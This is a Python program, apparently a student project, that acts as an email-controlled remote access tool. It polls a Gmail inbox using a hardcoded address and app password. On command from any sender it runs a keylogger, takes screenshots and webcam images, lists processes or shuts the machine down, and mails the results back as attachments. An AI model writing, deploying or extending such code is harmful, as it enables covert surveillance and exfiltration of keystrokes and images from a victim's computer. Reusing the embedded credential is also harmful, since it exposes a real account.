import key_logger as kl
import capture_screen as cs
import capture_webcam as cw
import app_process as ap
import shutdown_logout as sl
from PIL import Image
from io import BytesIO
import os
import imaplib
import smtplib
import time
import email
import email.utils
from email.mime.image import MIMEImage
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
import datetime


IMAP_URL = "imap.gmail.com"
SMTP_URL = "smtp.gmail.com"
USER = "embasedsiscon@gmail.com"
PASSWORD = "xfyc nqcb udyh vpmq"


def init():
    global imap, smtp
    
    imap = imaplib.IMAP4_SSL(IMAP_URL, 993)
    
    
    smtp = smtplib.SMTP_SSL(SMTP_URL)
    try:
        print("Initializing IMAP... ", end = '')
        imap.login(USER, PASSWORD)
        print("Done.")

        print("Initializing SMTP...", end = '')
        smtp.login(USER, PASSWORD)
        print("Done.")
    except imaplib.IMAP4.error as e:
        print(f"[Error] Login failed. Reason: {e}")

def send_mail(smtp, user, sender, msg: MIMEMultipart):
    print("Sending mail...", end = '')

    # Create a reply message
    reply_msg = MIMEMultipart()
    reply_msg['From'] = user
    reply_msg['To'] = sender
    reply_msg['Subject'] = "Server reply"
    reply_msg.attach(msg)

    # Send a reply message to the sender
    smtp.sendmail(user, sender, reply_msg.as_string())

    print("Done.")
    print("Mail sent to", sender, "successfully")
    print("Receiving mail...")

def receive_mail(imap, smtp):
    print("Receiving mail...")
    while True:
        # refresh mail box
        imap.select('Inbox')

        # search for unseen messages since last day
        date_since = (datetime.date.today() - datetime.timedelta(days=1)).strftime("%d-%b-%Y")
        status, data = imap.search(None, '(UNSEEN SINCE "' + date_since + '")')

        if data[0] == b'':
            continue
        else:
            print('New emails received')

            # Process the new messages
            for msg_id in data[0].split():
                typ, data = imap.fetch(msg_id, '(RFC822)')
                email_body = data[0][1]
                mail_message = email.message_from_bytes(email_body)

                # Get the sender, subject, and content of the message
                sender = mail_message['From']
                subject = mail_message['Subject']

                # check is multipart (ex: attachment, emoji, image)
                if mail_message.is_multipart():
                    content = mail_message.get_payload()[0].get_payload()
                else:
                    content = mail_message.get_payload()

                # Print the message details to the console
                print('- From:', sender)
                print('- Subject:', subject)
                print('- Content:', content)

                # Mark the message as read
                imap.store(msg_id, '+FLAGS', '\\SEEN')

                # do something here
                res = function(subject, content)

                # reply back to sender
                send_mail(smtp, USER, sender,  res)

        # Sleep for 5 second before checking for new emails again
        time.sleep(5)


commands = {
    "Key logger": kl.key_logger,
    "Screen capture": cs.capture_screen,
    "Webcam capture": cw.capture_webcam_image,
    "Shutdown/Logout": sl.shutdown_logout,
    "Application/Process": ap.application_process,
}

def function(subject, content):
    print("Processing message...")
    res = MIMEMultipart()
    result = None
    try:
        if content == '':
            result = commands[subject]()
        else:
            result = commands[subject](content)
    except ValueError as error:
        print("[Error]", error)
        result = f"Wrong Format at {subject}"

    if isinstance(result, str):
        # plaintext result
        if subject == "Application/Process":
            attachment = MIMEApplication(result.encode('utf-8'), Name="app_process.txt", _subtype="txt")
            attachment.add_header('Content-Disposition', 'attachment', filename="app_process.txt")
            print("- Application/process")
            res.attach(attachment)

        else:
            print('-', result)
            res.attach(MIMEText(result.encode('utf-8'), 'html', 'utf-8'))

    elif isinstance(result, Image.Image):
        # convert to binary and to MIMEImage
        with BytesIO() as buffer:
            result.save(buffer, format='PNG')
            png_bytes = buffer.getvalue()
        result = MIMEImage(png_bytes, _subtype="png")

        if subject == "Screen capture":
            # attach picture
            result.add_header('Content-Disposition', 'attachment', filename='screenshot.png')
            print("- Capture screen")
            res.attach(result)

        elif subject == "Webcam capture":
            # attach picture
            result.add_header('Content-Disposition', 'attachment', filename='webcam_image.png')
            print("- Capture webcam")
            res.attach(result)

    return res

if __name__ == "__main__":
    init()
    receive_mail(imap, smtp)

    # logout and close mailbox
    imap.logout()
    smtp.quit()